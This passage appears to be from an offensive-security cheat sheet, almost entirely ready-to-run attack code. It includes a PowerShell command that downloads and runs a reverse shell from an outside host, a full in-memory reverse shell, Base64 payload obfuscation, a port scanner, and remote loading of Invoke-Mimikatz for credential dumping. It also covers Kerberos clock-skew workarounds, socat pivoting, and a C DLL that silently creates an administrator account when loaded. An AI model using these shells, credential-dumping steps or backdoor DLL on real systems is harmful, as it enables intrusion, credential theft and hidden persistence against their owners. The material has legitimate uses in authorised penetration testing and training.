**Note**: event type is generally 'Security'

Download reverse shell for a Metasploit listener:

~~~powershell
powershell -c "(New-Object System.Net.WebClient).Downloadfile('[http://10.9.6.99:8099/revshell.exe',](http://10.9.6.99:8099/revshell.exe',) 'revshell.exe') ; Start-Process revshell.exe -Wait"
~~~

**Note**: `Start Process` is launched with the `-Wait` option since otherwise session could be immediately closed.

In-memory PowerShell reverse shell:

~~~powershell
$client = New-Object System.Net.Sockets.TCPClient('<attacker ip>',<attacker port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i= $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback= (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
~~~

Prepare and execute Base64 obfuscated reverse shell:

~~~powershell
# Base64 Encode unicode string
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<string payload>')

# Base64 Encode unicode file content
[System.Convert]::ToBase64String(([System.Text.Encoding]::Unicode.GetBytes([System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes('<file to encode>')))))

# Run encoded command
powershell -e <encoded command>
~~~

**Note**: Must read strings with Unicode encoding!

Same can be achieved in Linux using `iconv`:

~~~shell 
iconv -f UTF-8 -t UTF-16LE "<file to encode>" | base64 -w0
~~~

Scan open TCP ports with PowerShell:

~~~powershell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<Target Machine>",$_)) "Port $_ is open!"} 2>$null

1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $_ is open!"} 2>$null}
~~~

Use PowerSploit's `Invoke-Mimikatz.ps1` script to run mimikatz in memory:

~~~powershell
iex (iwr -UseBasicParsing http://<attacker ip>/Invoke-Mimikatz.ps1)
~~~

~~~powershell
# Run any mimikatz command
Inovke-Mimikatz -Command "<mimikatz command(s)>"
~~~

If the "AmbiguousMatchException" is raised, try to patch the `Invoke-Mimikatz.ps1` script as follows:

- Change the following line:   `$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')`
- To: `$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);`

Reference: [https://github.com/mitre/caldera/issues/38#issuecomment-396055260](https://github.com/mitre/caldera/issues/38#issuecomment-396055260)

### Clock Skew

If "Clock skew too great" error is obtained, sync the attacking machine with the DC:

~~~shell
ntpdate <DC IP>
~~~

or use `faketime` when launching `GetUserSPNs` script (useful when cannot update attacking machine system date):

~~~shell
faketime "$(sudo ntpdate <DC IP> 2>/dev/null | cut -d '(' -f 1)"
~~~

If working in a pivoted scenario and the NTP is not directly reachable, pivot UDP port `123` with `socat`:

~~~shell
# On pivot machine
socat TCP4-LISTEN:5555,fork UDP4:<DC-IP>:123

# On attacker machine
socat -T15 UDP4-LISTEN:123,fork TCP4:<Relay-IP>:5555
ntpdate <attacker machine ip>
~~~

### DLLs

Generic DLL template:

~~~c
#include <windows.h> 

int doSomeAction()
{
	// Implement something cool
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        doSomeAction();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
~~~

DLL template script to programatically add user (as administrator):

~~~c
#pragma comment(lib, "Netapi32.lib")
#include <windows.h> 
#include <lm.h>
#include <stdio.h>

void AddUserToWindows(const wchar_t *username, const wchar_t *password) {
    USER_INFO_1 ui;
    DWORD dwError = 0;

    // Initialize user information
    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)password;
    ui.usri1_priv = USER_PRIV_USER;  // Standard user (not admin by default)
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT; // Default user settings
    ui.usri1_script_path = NULL;

    // Add user
    NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
    
    if (status == NERR_Success) {
        wprintf(L"User '%s' added successfully.\n", username);
    } else {
        wprintf(L"Failed to add user. Error code: %d\n", status);
    }
}

void AddUserToGroup(const wchar_t *username, const wchar_t *group) {
    LOCALGROUP_MEMBERS_INFO_3 lgmi;
    lgmi.lgrmi3_domainandname = (LPWSTR)username;

    // Add user to the specified group
    NET_API_STATUS status = NetLocalGroupAddMembers(NULL, group, 3, (LPBYTE)&lgmi, 1);
    
    if (status == NERR_Success) {
        wprintf(L"User '%s' added to group '%s' successfully.\n", username, group);
    } else {
        wprintf(L"Failed to add user to group '%s'. Error code: %d\n", group, status);
    }
}

int doSomeAction()
{
    const wchar_t *username = L"<new username>";  // Change this to the desired username
    const wchar_t *password = L"<password>"; // Change to a secure password
    const wchar_t *group = L"Administrators";   // Add user to Administrators group

    // Add the user
    AddUserToWindows(username, password);

    // Add user to the "Administrators" group
    AddUserToGroup(username, group);
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        doSomeAction();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
~~~

Compile DLL:

~~~shell
x86_64-w64-mingw32-gcc -shared -o <output dll path> <input .c file> [-lnetapi32]
~~~

**Note**:

- `-lnetapi32` is required when using functions from `Netapi32.lib`